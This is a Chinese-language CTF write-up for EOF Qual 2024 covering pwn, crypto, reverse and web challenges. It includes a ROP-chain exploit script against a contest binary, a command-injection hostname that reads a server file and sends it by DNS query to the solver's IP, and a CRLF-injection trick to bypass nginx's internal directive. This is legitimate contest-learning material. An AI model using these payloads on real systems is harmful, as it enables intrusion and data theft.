# EOF Qual 2024 Writeup

- 隊名：熱分陰榻境物
- 學號：`109550157`
- 名次：$11$
- 總分：$2913$

以下 Writeup 依照解題順序放出。

# Welcome

- $\text{Type}$: $\text{Misc}$
- $\text{Points}$: $100$
- $\text{Solved Time}$: January 5th, 9:00:22 AM
- $\text{Flag}$: `AIS3{W3lc0mE_T0_A1S5s_EOF_2o24}`

差一點搶到這題的首殺：

![image](https://hackmd.io/_uploads/HkZdCv_dp.png)

以下為解出 $\text{Flag}$ 的照片：

![image](https://hackmd.io/_uploads/SkOXpl_Op.png)

# jackpot

- $\text{Type}$: $\text{Pwn}$
- $\text{Points}$: $337$
- $\text{Solved Time}$: January 5th, 4:11:45 PM
- $\text{Flag}$: `AIS3{JUST_@_e45y_INT_OVeRflow_4nD_Buf_oveRFLOW}`

解這題的時候因為錯把 Stack 搬到髒地方，本來應該很簡單的題目被我解到有點挫折。
會那麼晚解出來的原因主要是做題策略，我先看了 $\text{Web}$ 和 $\text{Pwn}$ 的題目，在 DNS Lookup Final 卡太久了。

很可惜的是，這也是這場我唯一解出的 $\text{Pwn}$ 題，其他題長到我都不想看 QAQ。

以下正式解題過程。

一開始就有一個簡單的 BOF 可以飛到 `jackpot` 上，而且輸入數字又能讓我偷看 `Stack` 上的東西。

基本上 `main` 應該都是被某個 `libc` 的 function call 起來的，去 `Stack` 上偷的 return address 就會是 `libc` 上的某個位置。

輸入 `31`，就是 return address 的位置：

```python=
r.recvuntil(b"number: ")
r.sendline(b"31")

r.recvuntil(b"ticket 0x")
ticket = int(r.recvline().strip(), 16)

offset = 0x29D90
libc_base = ticket - offset
```

隨手在 `libc` 裡搜了 ORW 和操作 registers 的 gadgets：

```python=
libc_pop_rdi_ret = libc_base + 0x000000000002A3E5
libc_pop_rsi_ret = libc_base + 0x000000000002BE51
libc_pop_rdx_ret = libc_base + 0x00000000000796A2
libc_pop_rsp_ret = libc_base + 0x0000000000035732
libc_open_addr = libc_base + 0x1142F0
libc_read_addr = libc_base + 0x1145E0
libc_write_addr = libc_base + 0x114680
```

Leak 不到 stack 的位置，所以只好 stack pivot 把 stack 搬到我認識的地方，並且跳回 `main+160` 再輸入一次。我選擇 `.data` 段偏移 `0x100` 當作新的 stack 的位置：

```python=
main_160 = 0x401367
data_start = 0x0000000000404060

rbp = data_start + 0x100
payload = b"A" * 112 + p64(rbp) + p64(main_160)

r.recvuntil(b"name: ")
r.sendline(payload)
```

下一輪就可以串 ROP chain 放檔名，不過因為我放的不是 `.bss` 段之類的，感覺原本的髒東西讓我做事做得很痛苦。

串出來的 ROP chain 長這樣：

```python=
rop_chain = b""

rop_chain += p64(libc_pop_rdi_ret) + p64(rbp - 0x70)
rop_chain += p64(libc_pop_rsi_ret) + p64(0)
rop_chain += p64(libc_pop_rdx_ret) + p64(0)
rop_chain += p64(libc_open_addr)

rop_chain += p64(libc_pop_rdi_ret) + p64(3)
rop_chain += p64(libc_pop_rsi_ret) + p64(data_start)
rop_chain += p64(libc_pop_rdx_ret) + p64(0x62)
rop_chain += p64(libc_read_addr)

rop_chain += p64(libc_pop_rdi_ret) + p64(1)
# rop_chain += p64(libc_pop_rsi_ret) + p64(data_start)
# rop_chain += p64(libc_pop_rdx_ret) + p64(0x62)
rop_chain += p64(libc_write_addr)
```

因為我的 stack 爛掉的原因，我 return address 後面放不下太多 gadgets。自從上次在 `Note` 用了搬動 `$rsp` 的奇淫怪招後，我直接再次中毒，把 ROP chain 切成二段：一段正常接在 return address 後 (`mov_rsp_chain`)、一段直接放在前面本來應該塞垃圾的地方(`rop_chain`)，並在 `mov_rsp_chain` 的最後把 `$rsp` 搬到 `rop_chain` 上。

所以實際上我的二個 chain 長這樣：

```python=
jackpot = 0x40129E
filename = b"flag\x00"

mov_rsp_chain = p64(jackpot) # 而且如果不跳到 jackpot 上還會讓中間 `puts()` 壞掉 = =

mov_rsp_chain += p64(libc_pop_rdi_ret) + p64(rbp - 0x70) # address of payload
mov_rsp_chain += p64(libc_pop_rsi_ret) + p64(0)
mov_rsp_chain += p64(libc_pop_rdx_ret) + p64(0)
mov_rsp_chain += p64(libc_open_addr)

mov_rsp_chain += p64(libc_pop_rdi_ret) + p64(3)
mov_rsp_chain += p64(libc_pop_rsi_ret) + p64(data_start) # I place FLAG at `.data`
mov_rsp_chain += p64(libc_pop_rdx_ret) + p64(0x62) # copy from HACHAMA :P

mov_rsp_chain += p64(libc_pop_rsp_ret) + p64(rbp - 0x70 + len(filename)) # Move $rsp


rop_chain = b""
rop_chain += p64(libc_read_addr)

rop_chain += p64(libc_pop_rdi_ret) + p64(1)
rop_chain += p64(libc_write_addr)
```

所以送出去的 payload 長這樣：

```python=
payload = (
    filename
    + rop_chain
    + b"A" * (112 - len(filename) - len(rop_chain))
    + p64(rbp)
    + mov_rsp_chain
)
r.sendline(payload)
```

以下為解出 $\text{Flag}$ 的照片：

![image](https://hackmd.io/_uploads/r1ASYbO_T.png)

# Flag Generator

- $\text{Type}$: $\text{Reverse}$
- $\text{Points}$: $100$
- $\text{Solved Time}$: January 5th, 4:40:24 PM
- $\text{Flag}$: `AIS3{U$1ng_w1Nd0w5_I$_sUch_a_p@In....}`

花了不到半小時就解出來了，主要因為他是 Lab 題的弱化版吧。

簡單 IDA 看了一下，發現他會寫檔耶，那直接跑起來好了：

![image](https://hackmd.io/_uploads/Hkps5ZOuT.png)

結果出來的是個 0 bytes 的 `flag.exe`，看一下 code，哇居然忘了寫檔：

![image](https://hackmd.io/_uploads/Hy6ljWuuT.png)

不過要寫的東西已經在 heap 上了，直接動態跑起來停在 `writeFile` 的函式上，找一下 PE file 的 address 在哪，去 dump PE 檔就好，要寫的 size 也已經很好心的告訴我們是 `0x600` 了：

![image](https://hackmd.io/_uploads/r1gHV3Z_u6.png)

以下為解出 $\text{Flag}$ 的照片：

![image](https://hackmd.io/_uploads/HJmY3-OdT.png)

# Baby AES

- $\text{Type}$: $\text{Crypto}$
- $\text{Points}$: $331$
- $\text{Solved Time}$: January 5th, 6:37:01 PM
- $\text{Flag}$: `AIS3{_BL0ck_C1pher_mOde_M@stER_}`

本場覺得最好玩的題目，讓人對 AES 可以有更深入的印象。

重點在於 AES 的加密跟解密是對稱的，只要用一樣的 key 跟 iv 就能在明文跟密文之間作加解密。

以下把 counter 稱作 `cnt_i` 如 `cnt_1`, `cnt_2`, ...；一開始給出的三個加密後的密文叫做 `ct_10, ct_11`, `ct_20, ct_21`, `ct_30, ct_31`，其中 01 表示的是密文的 block #；`pt_10, pt_11`, `pt_20, pt_21`, `pt_30, pt_31` 是對應的未知明文。

可以根據 source code 列出以下關係式：

1. $AES\_enc(\text{cnt_1}) \oplus \text{pt_10} \oplus \text{ct_10} = 0$.
2. $AES\_enc(\text{ct_10}) \oplus \text{pt_11} \oplus \text{ct_11} = 0$.
3. $AES\_enc(\text{cnt_2}) \oplus \text{pt_20} \oplus \text{ct_20} = 0$.
4. $AES\_enc(\text{?????}) \oplus \text{pt_21} \oplus \text{ct_21} = 0$, where $?????$ is $AES\_enc(\text{cnt_2})$.
    - 也就是說，$AES\_enc(\text{pt_20} \oplus \text{ct_20}) \oplus \text{pt_21} \oplus \text{ct_21} = 0$
6. $AES\_enc(\text{cnt_3}) \oplus \text{pt_30} \oplus \text{ct_30} = 0$.
7. $AES\_enc(\text{cnt_4}) \oplus \text{pt_31} \oplus \text{ct_31} = 0$.

觀察以下幾個重點：

- 下一輪 server 會開始用 `cnt_4` 當 iv，但在 `6.` 它已經有被使用過，可以直接將 $\text{ct_31}$ 解密成 $\text{pt_31}$。
- 進一步說，我們可以利用 `CTR` mode 來預知未來，這使我們能夠做出跟 $AES\_enc(\text{cnt_5})$, $AES\_enc(\text{cnt_6})$ 之後有關係的等式。
- 由於 `CFB` 是用這輪的密文當下一輪的 iv，我們透過已知的 iv 配合可控制的明文來得出特定的下輪 iv。
  - 舉例來說，若我們想在初始 iv 是 `cnt_5` 的時候，以 `cnt_1` 為 iv 去解密密文，那我可以在初始 iv 是 `cnt_4` 時先利用 `CTR` mode ，在下一個 block 放入 `cnt_1` 作為明文，把密文記做 `key_1`；接著只需在初始 iv 是 `cnt_5` 的時候的明文放入 `key_1`，加密出來的密文就會是 `cnt_1`，此時選用 `CFB` mode 就能用 `cnt_1` 作為 iv 去加密 `密文`，進而達到解密的效果。

由於沒有限制可以傳入的明文長度，我們可以一開始把想控制的 iv 都在 `CTR` modes 接在後面，順路把 $\text{pt_31}$ 給解出來。

以下是我一開始用 `CTR` mode 串出來的關係式，第一項是 iv、第二項是傳入的明文、第三項是記錄下來供後續使用的密文：

1. $AES\_enc(\text{cnt_4}) \oplus \text{ct_31} \oplus \text{pt_31} = 0$.
2. $AES\_enc(\text{cnt_5}) \oplus \text{cnt_1} \oplus \text{key_1} = 0$.
3. $AES\_enc(\text{cnt_6}) \oplus \text{cnt_2} \oplus \text{key_2} = 0$.
4. $AES\_enc(\text{cnt_7}) \oplus \text{cnt_3} \oplus \text{key_3} = 0$.
5. $AES\_enc(\text{cnt_8}) \oplus \text{ct_10} \oplus \text{key_4} = 0$.

接著在 `CFB` mode 依序用到的關係式有：

1. $AES\_enc(\text{cnt_5}) \oplus \text{key_1} \oplus \text{cnt_1} = 0$.
    - $AES\_enc(\text{cnt_1}) \oplus \text{ct_10} \oplus \text{pt_10} = 0$.
2. $AES\_enc(\text{cnt_6}) \oplus \text{key_2} \oplus \text{cnt_2} = 0$.
    - $AES\_enc(\text{cnt_2}) \oplus \text{ct_20} \oplus \text{pt_20} = 0$.
3. $AES\_enc(\text{cnt_7}) \oplus \text{key_3} \oplus \text{cnt_3} = 0$.
    - $AES\_enc(\text{cnt_3}) \oplus \text{ct_30} \oplus \text{pt_30} = 0$.
4. $AES\_enc(\text{cnt_8}) \oplus \text{key_4} \oplus \text{ct_10} = 0$.
    - $AES\_enc(\text{ct_10}) \oplus \text{ct_11} \oplus \text{pt_11} = 0$.

這樣我第一次連線就有 `pt_10`、`pt_20`、`pt_30` 跟目前沒什麼用的 `pt_11`。

因為沒想到 `cnt_2` 後面可以直接再串一次 `CFB`，所以硬是多出了下一次連線。

第二次連線的 `CTR` mode 用了以下關係式：

1. $AES\_enc(\text{cnt_4}) \oplus \text{ct_31} \oplus \text{pt_31} = 0$.
2. $AES\_enc(\text{cnt_5}) \oplus \text{ct_10} \oplus \text{key_1} = 0$.
3. $AES\_enc(\text{cnt_6}) \oplus \text{cnt_2} \oplus \text{key_2} = 0$.

接著在 `CFB` mode 依序用到的關係式有：

1. $AES\_enc(\text{cnt_5}) \oplus \text{key_1} \oplus \text{ct_10} = 0$.
    - $AES\_enc(\text{ct_10}) \oplus \text{ct_11} \oplus \text{pt_11} = 0$.
2. $AES\_enc(\text{cnt_6}) \oplus \text{key_2} \oplus \text{cnt_2} = 0$.
    - $AES\_enc(\text{cnt_2}) \oplus \text{ct_20} \oplus \text{pt_20} = 0$.

之所以要做出 `pt_20` 是因為 $AES\_enc( AES\_enc(\text{cnt_2}) ) = AES\_enc( \text{pt_20} \oplus \text{ct_20} )$.

所以就有了下一次的 `CTR` mode：

1. $AES\_enc(\text{cnt_8}) \oplus (\text{pt_20} \oplus \text{ct_20}) \oplus \text{key_1} = 0$.

以及最後一次的 `CFB` mode：

1. $AES\_enc(\text{cnt_7})$ 沒有做事。
2. $AES\_enc(\text{cnt_8}) \oplus \text{key_1} \oplus (\text{pt_20} \oplus \text{ct_20}) = 0$.
    - $AES\_enc(\text{pt_20} \oplus \text{ct_20}) \oplus \text{ct_21} \oplus \text{pt_21} = 0$.

這樣我第二次連線就有 `pt_11`、`pt_21`、`pt_31`。

二次連線就能分別組出 flag 的左半邊跟右半邊。

以下為解出 $\text{Flag}$ 的照片：

![image](https://hackmd.io/_uploads/SkGLErO_p.png)

# Baby RSA

- $\text{Type}$: $\text{Crypto}$
- $\text{Points}$: $191$
- $\text{Solved Time}$: January 5th, 7:48:01 PM
- $\text{Flag}$: `AIS3{C0PPer5mItHs_5H0R7_p@d_a7T4Ck}`

這題一開始確實列了一些式子，它不過就是把 `flag` 的低位吃掉了。

不過後來發現每次連線的 `e` 都是 `3` with 不同的 `n`，且明文都是沒有加鹽的 `FLAG`，所以就建了多次連線做 broadcast attack 了。

每次建立連線拿 pair 的 utils：

```python=
def get_conn():
    # return process(b"./rsa.py")
    return remote("chal1.eof.ais3.org", 10002)


def get_a_pair():
    r = get_conn()
    line = r.recvline()
    n, e = int(line[:-6].strip().split(b"=")[1]), 3

    line = r.recvline()
    enc = int(line.strip().split(b" ")[2])

    r.close()
    return n, enc
```

之後就是一直建立連線做 CRT，直到 `AIS3` 出現即可。

```python=
rs = []
ms = []

flag_final = b""

while True:
    n, enc = get_a_pair()

    rs.append(Integer(enc))
    ms.append(Integer(n))

    flag3 = CRT_list(rs, ms)
    print(flag3)

    flag, is_cube = find_cubic_root(flag3)

    if is_cube and b"AIS3" in long_to_bytes(flag):
        flag_final = long_to_bytes(flag)
        break
```

順帶一提，因為找不到算大數的 cubic root 的函式，所以我自己寫了一個二分搜：

```python=
def find_cubic_root(n):
    n = Integer(n)
    l = 0
    r = n
    while l < r:
        mid = Integer((l + r) // 2)
        if mid**3 < Integer(n):
            l = mid + 1
        else:
            r = mid
    return l, l**3 == Integer(n)
```

以下為花了三次連線解出 $\text{Flag}$ 的照片：

![image](https://hackmd.io/_uploads/Hy2Pwru_6.png)

# DNS Lookup Tool: Final

- $\text{Type}$: $\text{Web}$
- $\text{Points}$: $100$
- $\text{Solved Time}$: January 6th, 12:03:23 AM
- $\text{Flag}$: `AIS3{jU$T_3asY_coMM@Nd_INj3c7I0N}`

本機試了一下發現假的 flag 可以直接當成被查詢的 hostname，且在上面戳的時候把自己 IP 當成 name server 的參數傳上去，本機確實能在 53 port 上收到封包。

所以把以下 hostname 傳入即可。

`$(cat $(find / -maxdepth 1 -size +0 -type f -printf '%p')) <My IP>`

它的意思是先找到根目錄下 min size 為 0 的檔名，並且用 `cat` 把檔案輸出，最後將輸出結果作為 hostname 發 DNS query 到 `<My IP>`。

![image](https://hackmd.io/_uploads/B1GWoEdu6.png)

以下為解出 $\text{Flag}$ 的照片：

![image](https://hackmd.io/_uploads/H1Zls4OO6.png)

# Baby ECDLP

- $\text{Type}$: $\text{Crypto}$
- $\text{Points}$: $469$
- $\text{Solved Time}$: January 6th, 12:10:50 PM
- $\text{Flag}$: `AIS3{3@SY_INT3geR_fAc7OrIZa71On_AnD_An_iNtRODucit0n_7o_m0V_A7Tacks}`

根據 `a, b` 的矩陣可以得出 `p, q` 的二元三次聯立方程式，直接 sage solver 求解即可：

```python=
# a = (p + 1) * (q + 1) - (p + q) ** 2 - 1
# b = p * q * (p + q - 1)

# Solve p, q
p, q = var("p, q")
ans = solve([(p + 1) * (q + 1) - (p + q) ** 2 - 1 == a, p * q * (p + q - 1) == b], p, q)
```

總共解出 6 組解，不過因為對稱性，實際上只有 3 組解，其中只有一組解二個數字都是正的。
不過我還是寫了一些判斷式去抓出合法的解：

```python=
ans = [
    [
        1291570437571548108602677722191376815944720207670689841965090388326940686642654446945208820370796863647650727896954926930018377575753937822622270407516491,
        -1632612641432289359777032229474739824502070018852182367919181992543886926746743642598380442660715643590514605193264497966141970510558181067769726348913093,
    ],
    # ...
]


for p, q in ans:
    if p < 0 or q < 0:
        continue
    if isPrime(p) and isPrime(q):
        print(p, q)
```

最後用的 `p, q` 是：

```python
p = 1291570437571548108602677722191376815944720207670689841965090388326940686642654446945208820370796863647650727896954926930018377575753937822622270407516491
q = 341042203860741251174354507283363008557349811181492525954091604216946240104089195653171622289918779942863877296309571036123592934804243245147455941396603
```

在看了出題者 $\text{maple3142}$ 大大某一次的 [WriteUp](https://blog.maple3142.net/2023/11/05/tsg-ctf-2023-writeups/) 之後，從裡面學到說 $\bmod {pq}$ 的 curve 其實跟 $\bmod {p}$ 以及 curve 和 $\bmod {q}$ 的 curve 有關係：

$$
E(\mathbb F_p) \cdot E(\mathbb F_q) = E(\mathbb F_{pq})
$$

所以只要分別在二個曲線上能解 discrete log，就能用 CRT 把 flag 組回來。

不過前提是二個曲線的性質夠好。

用以下的 code 把二個曲線構造出來，並且看一下 order 的因數有哪些：

```python=
Ep = EllipticCurve(Zmod(p), [ZZ(a % p), ZZ(b % p)])
Eq = EllipticCurve(Zmod(q), [ZZ(a % q), ZZ(b % q)])

kp = Ep.order()
kq = Eq.order()

factor_p = prime_factors(kp)
factor_q = prime_factors(kq)

print(f"{kp = }")
print(f"{kq = }")

print(f"{factor_p = }")
print(f"{factor_q = }")
```

得出來的結果如下，看起來二個曲線都滿 smooth 的：

```python=
kp = 1291570437571548108602677722191376815944720207670689841965090388326940686642654446945208820370796863647650727896954926930018377575753937822622270407516492
kq = 341042203860741251174354507283363008557349811181492525954091604216946240104089195653171622289918779942863877296309571036123592934804243245147455941396604
factor_p = [2, 2618624989, 2657157707, 2693325077, 2784827567, 2941302523, 3213804227, 3387575977, 3404686667, 3609594799, 3676204513, 3676855411, 3958587337, 4022270251, 4060659829, 4232934701, 4249822091]
factor_q = [2, 2207017691, 2323729433, 2482365503, 2651175421, 2681159627, 2806752497, 2917810019, 3083485841, 3330526183, 3397973203, 3525701819, 3827317789, 3838183633, 3856519883, 3869498959, 4265577601]
```

不過我沒有意識到這樣就可以直接 discrete log 就好，我用了仿照 Lab 的方法對每個因數構了一個新的 `G'` 和對應的 `C'`，分別求 discrete log 後再用 CRT 組起來。

所以看起來會有以下的 code：

```python=
Gp = Ep(G[0], G[1])
Cp = Ep(C[0], C[1])
kGp = Gp.order()
factor_kGp = prime_factors(kGp)

rs = []
ms = []

for f in factor_kGp:
    t = kGp // f
    print("Solving DLOG...")
    dlog = discrete_log(t * Cp, t * Gp, operation="+")
    print("Solved DLOG! {}/{}".format(dlog, f))
    rs += [dlog]
    ms += [f]

sp = CRT_list(rs, ms)

print(f"{rs = }")
print(f"{ms = }")
print(f"{sp = }")
```

對 q 做一樣的事情，獲得 `sq`。

最後用 `sp` 跟 `sq` 組出 `flag` 即可。

```python=
rs = [sp, sq]
ms = [kGp, kGq]

flag = long_to_bytes(CRT_list(rs, ms))
print(flag)
```

以下為解出 $\text{Flag}$ 的照片：

![image](https://hackmd.io/_uploads/BJAlTrO_p.png)

# Baby Side Channel Attack

- $\text{Type}$: $\text{Crypto}$
- $\text{Points}$: $475$
- $\text{Solved Time}$: January 6th, 1:07:30 PM
- $\text{Flag}$: `AIS3{5IDe_ChaNNeL_I$_e4$y_wH3n_tHE_DAT4_le4K49E_IS_EXac7}`

看了一下 trace 發現哇這不是超水的嗎，exponent 輕鬆 leak，這樣就有 $d$ 了耶！

Leak $d$ 的方式是把關鍵的 trace 放到另外一個檔案叫 `leak_d.txt`，再用 $\text{Double and Add}$ 去求出 exponent：

```python=
r = Integer(0)
a = Integer(1)

with open("leak_d.txt") as f:
    lines = f.readlines()

    for i in range(len(lines)):
        if "8" in lines[i]:
            if "9" in lines[i + 1]:
                r += a
            a <<= 1
```

後來才發現沒有 $n$，這根本才是這題的難點。

不過事情算好解決，想辦法去拿已有的資訊來求 $n$ 即可。

常見的手段是去對二個 $n$ 的倍數求 Greatest Common Divisor，以這題來說任意 $a^b - (a^b \bmod n)$ 都會是 $n$ 的倍數。

題目給了 $e^d \bmod n$ 和 $d^e \bmod n$，但不要被拐走去算什麼 $e^d$，只要把 $d$ 放到 exponent 上那都是天文數字。

我的作法是用 $d^e - (d^e \bmod n)$ 和 $(e^d \bmod n)^e - e$ 做 $\gcd$，後者就相當於做解密但沒有 $\bmod n$。

```python=
de = pow(d, e) - de
ede = pow(ed, e) - e
n = gcd(ede, de)
```

有了 $n$ 之後，直接用密文和密鑰去解出 flag 即可。

```python=
flag = long_to_bytes(pow(C, d, n))
print(flag)
```

以下為解出 $\text{Flag}$ 的照片：

![image](https://hackmd.io/_uploads/Hy_zZUuOa.png)

# Stateful

- $\text{Type}$: $\text{Reverse}$
- $\text{Points}$: $238$
- $\text{Solved Time}$: January 6th, 2:57:06 PM
- $\text{Flag}$: `AIS3{@r3_y0U_@_sTATEful_0R_St@T3LeS5_CtF3r}`

其實沒有 reverse 太多東西，當我看到它的 `state_machine` 裡面的 `state_*` function 都是對傳入的參數做線性的操作後，我就打算直接做個單位矩陣去 leak 出整個 `state_machine` 所做的線性變換。

不過因為擔心參數不能是什麼不可視字元，所以我是用 `'0'`, `'1'` 字元去做所謂的單位矩陣。

基本上就是利用本機 `gdb` 跑起來後，memory 都有固定的 layout，直接下同一個斷點、dump 同一段 address 的資料下來即可。

我是用以下 `gdb` 指令 dump 的：

```shell=
starti {'0''1' string wher '1' located at the index i}
b *<address after calling state_machine>
c
dump memory bin/{i} <start of Block> <End of Block>
quit
```

用了以下 python script 去開 `subprocess` 執行 inline 的 `gdb` command：

```python=
for i in range(43):
    s = ["0"] * 43
    s[i] = "1"
    s = "".join(s)
    command = f"gdb -ex 'starti {s}' -ex 'b *0x00005555555569d7' -ex 'c' -ex 'dump memory bin/{i} 0x000055555555a2a0 0x000055555555a2a0+43' -ex 'quit' ./stateful.exe"
    subprocess.run(command, shell=True)
```

Dump 完整個線性變換後，直接對原本 check 的 string 做逆變換即可。實際上就是求個反矩陣。

換句話說好了，假設 $A$ 是整坨線性變換、$X$ 是我傳入的 $01$ 字串、$B = AX$ 是 dump 出來的矩陣、$x$ 是 flag、$b$ 是 check 的字串，那麼：

$$
Ax = b
$$

$$
x = A^{-1}b = XB^{-1}b
$$

反正就是做個座標變換而已。

$X$ 矩陣的構造：

```python=
X = []

for i in range(43):
    s = [ord("0")] * 43
    s[i] = ord("1")
    X.append(s)

X = Matrix(Zmod(256), X)
```

$B^{-1}$ 的構造：

```python=
B = []

for i in range(43):
    with open(f"bin/{i}", "rb") as f:
        B.append(f.read())


B = Matrix(Zmod(256), B).transpose()
B_inv = B.inverse()
```

$b$ 向量的構造，那坨 hex 是從 IDA 撈的：

```python=
b = "241AAC33B8A3140CED4265555FC493A1FB9B9870DB546CAEF9525F0D744049968C655335C3DA748033EC7D"
b = [int(b[i : i + 2], 16) for i in range(0, len(b), 2)]
b = vector(Zmod(256), b)
```

最後得出 flag：

```python=
flag = X * B_inv * b
flag = "".join([chr(int(x)) for x in flag])
print(flag)
```

以下為解出 $\text{Flag}$ 的照片：

![image](https://hackmd.io/_uploads/H1ylULudp.png)

# Internal

- $\text{Type}$: $\text{Web}$
- $\text{Points}$: $176$
- $\text{Solved Time}$: January 6th, 3:47:38 PM
- $\text{Flag}$: `AIS3{JUsT_s0m3_FuNNY_n91NX_fEatur3}`

從 Lab 和 HW 時就一直心心念念的 CRLF Injection，居然是在這裡登場了！

一開始看到 source code 會幫我們放 header 到 `Location:` 中，就大概知道要從這邊塞東西，誒不過怎麼是往 response 塞？

我先沒有想那個，而是先試試看 CRLF Injection 的可行性。於是我把 container 打開，跑進去 proxy 機裡面用 `curl -v` 看了一下封包長相：

![image](https://hackmd.io/_uploads/BJkCILdd6.png)

Heehee! 還真的可以，那再來看起來就是 bypass nginx 的 internal 囉！

看了一下 nginx 的 document：

![image](https://hackmd.io/_uploads/ByHED8_up.png)

被 Reverse Proxy 的 upstream server 在封包中設定的 `X-Accel-Redirect` 的 path 是可以通過 internal directive 的限制的，所以我只需要塞 `X-Accel-Redirect: /flag` 即可：

![image](https://hackmd.io/_uploads/BJeJAwLOup.png)

以下為解出 $\text{Flag}$ 的照片：

![image](https://hackmd.io/_uploads/S1JDuI_da.png)

# Pixel Clicker

- $\text{Type}$: $\text{Reverse}$
- $\text{Points}$: $396$
- $\text{Solved Time}$: January 7th, 11:39:53 AM
- $\text{Flag}$: `AIS3{jU$T_4_51Mple_ClICKEr_9am3}`

一直在試著想把 Baby XOR 解出來，但一直都沒有想法去求出 mods。
看了一下 scoreboard 覺得不妙，只好先來把大家都做的 Pixel Clicker 做掉。

本來我是很沒有耐心要去 reverse 裡面的東西，中途一直放棄。

反正我還是逆了一點點，大概有抓到關鍵如 `cnt % 600 == 1` 和 `>= 360000` 的資訊。
但我一直沒看出來到底 flag 會出現在哪裡？

![image](https://hackmd.io/_uploads/H1zDqUu_T.png)

![image](https://hackmd.io/_uploads/BJjD98O_6.png)

直到我跑去蹲在馬桶上，在那邊想如果要放 flag 的話會放在哪？
長度 600 的東西，聽起來不太像是 flag + 垃圾，360000 就更不可能了。

咦？該不會這是一張圖片吧？
離開廁所之後又玩了一下 Pixel Clicker，發現 Window 上面顯示的 header 其實滿怪的，本來以為是位置之類的資訊，結果居然是什麼 RGB value 之類的？

![image](https://hackmd.io/_uploads/S1ho98uda.png)

有了想法之後，大致上就是猜測某個函式後會有那張圖片出現在 memory 上，大概就去停在 `cnt % 600 == 1` 這個 condition 中了之後，call 完 `get_block_1A60()` 的位置，然後去 `Block` 的位置上撈東西。

去 `.data` 段 (`0x5708`) 的地方找到 `click_count`，把它改成 `600`：

![image](https://hackmd.io/_uploads/SyCUdvddT.png)

停在 `0x1424` 後，再去按一下：

![image](https://hackmd.io/_uploads/SkcXdDdOa.png)

去 `$rsp + 0x68` 的位置，找到 `Block` 的 address：

![image](https://hackmd.io/_uploads/BkkqowdOa.png)

看了 magic number，看起來是 `BMP` 圖檔沒錯！

![image](https://hackmd.io/_uploads/ryVRivu_p.png)

從 header 可以看出 size 是 `0x15F936` bytes，直接把這張圖檔 dump 下來：

![image](https://hackmd.io/_uploads/B1Gm3Ddua.png)

以下為解出 $\text{Flag}$ 的圖片：

![AIS3{jU$T_4_51Mple_ClICKEr_9am3}](https://hackmd.io/_uploads/HJIE6w_Oa.png)
